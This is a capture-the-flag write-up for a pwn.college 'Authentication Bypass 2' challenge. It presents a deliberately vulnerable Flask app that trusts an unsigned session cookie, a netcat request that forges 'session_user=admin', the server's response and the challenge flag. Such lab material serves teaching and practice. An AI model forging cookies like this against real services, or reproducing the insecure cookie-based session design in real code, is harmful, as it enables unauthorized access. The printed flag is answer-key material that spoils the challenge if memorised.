---
layout: page
title: "🔐 Authentication Bypass 2 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

We’re given a Flask web application using a temporary in-memory SQLite database. The goal is to log in as the `admin` user and retrieve the flag.

The authentication logic strictly checks for both username and password using parameterized SQL:

```python
user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
```
However, the session mechanism is based entirely on cookies and trusts the session_user cookie value.

### Source Code
```
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    response = flask.redirect(flask.request.path)
    response.set_cookie('session_user', username)
    return response

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.cookies.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

---

## Vulnerability
The session authentication is based solely on the session_user cookie:
```bash
username := flask.request.cookies.get("session_user", None)
```
If session_user=admin, the flag is shown. This means we can skip login entirely by forging this cookie manually in our request.

---

## Exploit
Send a raw HTTP request using netcat with the session_user=admin cookie:
```bash
hacker@web-security~authentication-bypass-2:~$ printf "GET / HTTP/1.0\r\nHost:challenge.localhost\r\nCookie: session_user=admin\r\n\r\n" | nc challenge.localhost 80
```

---

## Flag

Output from the request:
```bash
HTTP/1.1 200 OK
Server: Werkzeug/3.0.6 Python/3.8.10
Date: Sun, 20 Jul 2025 08:46:34 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 305
Connection: close

<html><body>Hello, admin!<br>Here is your flag: pwn.college{8EIgMcJePG4zRoeIZK588Rs1lYJ.QXycTN2wSM0IzMyEzW}
...
```
Flag: pwn.college{8EIgMcJePG4zRoeIZK588Rs1lYJ.QXycTN2wSM0IzMyEzW}
---
